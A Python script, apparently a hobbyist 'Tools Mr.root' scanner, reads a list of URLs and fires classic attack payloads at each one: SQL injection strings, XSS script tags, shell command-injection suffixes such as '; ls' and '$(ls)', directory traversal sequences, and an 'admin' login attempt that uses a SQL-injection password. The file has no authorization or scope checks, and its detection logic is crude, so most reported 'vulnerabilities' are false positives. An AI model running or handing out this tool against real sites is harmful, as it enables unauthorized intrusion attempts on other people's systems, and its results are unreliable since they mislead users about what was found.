import requests
import argparse
import time
import os
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
import pyfiglet

# Initialize colorama
init(autoreset=True)

# Function to simulate the white line effect up to 100
def loading_effect():
    for i in range(101):
        print(f"\r{'=' * i}{'.' * (100 - i)}", end="")
        time.sleep(0.05)
    print("\n")
    time.sleep(1)

# Function to display the welcome message with big font and colors
def show_welcome_message():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen (works on both Windows and Unix)

    # Display "Welcome to Tools" in large font
    welcome_text = pyfiglet.figlet_format("Welcome to Tools")
    print(Fore.YELLOW + welcome_text)  # Print the welcome message in yellow
    time.sleep(5)  # Wait for 5 seconds before continuing

# SQL Injection Detection
def check_sql_injection(url):
    payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a", '" OR "a"="a']
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" not in response.text and response.status_code == 200:
            print(f"{Fore.GREEN}[+] SQL Injection vulnerability found in: {url}")
            print(f"  Payload: {payload}")
            return True
    return False

# XSS Detection
def check_xss(url):
    payloads = ['<script>alert(1)</script>', '<img src="x" onerror="alert(1)">']
    for payload in payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"{Fore.GREEN}[+] XSS vulnerability found in: {url}")
            print(f"  Payload: {payload}")
            return True
    return False

# Admin Bypass Detection
def check_admin_bypass(url):
    payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a", '" OR "a"="a']
    response = requests.post(url, data={"username": "admin", "password": payloads[0]})
    if "Welcome Admin" in response.text:  # Example: adjust based on the actual admin page response
        print(f"{Fore.GREEN}[+] Admin Bypass vulnerability found in: {url}")
        print(f"  Payload: {payloads[0]}")
        return True
    return False

# Command Injection Detection
def check_command_injection(url):
    payloads = ["; ls", "| ls", "& ls", "$(ls)"]
    for payload in payloads:
        response = requests.get(url + payload)
        if "bin" in response.text:  # A basic check to see if we get command output
            print(f"{Fore.GREEN}[+] Command Injection vulnerability found in: {url}")
            print(f"  Payload: {payload}")
            return True
    return False

# Directory Traversal Detection
def check_directory_traversal(url):
    payloads = ["../", "..%2f", "%2e%2e%2f"]
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" not in response.text and response.status_code == 200:
            print(f"{Fore.GREEN}[+] Directory Traversal vulnerability found in: {url}")
            print(f"  Payload: {payload}")
            return True
    return False

# Generic vulnerability scanning function
def scan_site(url, vuln_type):
    if vuln_type == 'sql':
        return check_sql_injection(url)
    elif vuln_type == 'xss':
        return check_xss(url)
    elif vuln_type == 'admin':
        return check_admin_bypass(url)
    elif vuln_type == 'cmd':
        return check_command_injection(url)
    elif vuln_type == 'dir':
        return check_directory_traversal(url)
    else:
        print(f"{Fore.RED}[!] Unknown vulnerability type.")
        return False

# Main function to parse arguments and perform scanning
def main():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
    loading_effect()  # Display loading effect up to 100
    show_welcome_message()  # Show welcome message
    
    # Now start the program with "Tools Mr.root"
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen after welcome message
    print(Fore.CYAN + pyfiglet.figlet_format("Tools Mr.root"))  # Display tool name in large font
    print(Fore.GREEN + "Available Commands:")
    print(Fore.YELLOW + "[1] SQL Injection scan (sql)")
    print(Fore.YELLOW + "[2] XSS scan (xss)")
    print(Fore.YELLOW + "[3] Admin Bypass scan (admin)")
    print(Fore.YELLOW + "[4] Command Injection scan (cmd)")
    print(Fore.YELLOW + "[5] Directory Traversal scan (dir)")
    print(Fore.RED + "[6] Exit")
    
    # Ask for user input for scanning
    vuln_type = input(Fore.CYAN + "Enter the vulnerability type (e.g., sql, xss, admin, cmd, dir): ").strip().lower()
    if vuln_type not in ['sql', 'xss', 'admin', 'cmd', 'dir']:
        print(f"{Fore.RED}[!] Invalid option!")
        return

    url_list = input(Fore.CYAN + "Enter the path to the URL list file (e.g., urls.txt): ").strip()
    if not url_list:
        print(f"{Fore.RED}[!] URL list file not provided!")
        return

    # Read URLs from the file
    try:
        with open(url_list, 'r') as file:
            urls = file.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[!] The file '{url_list}' was not found!")
        return

    for url in urls:
        url = url.strip()
        print(f"{Fore.CYAN}Scanning {url} for {vuln_type}...")
        if scan_site(url, vuln_type):
            print(f"{Fore.GREEN}[+] Vulnerability found in {url}")
        else:
            print(f"{Fore.RED}[-] No vulnerability found in {url}")

if __name__ == '__main__':
    main()
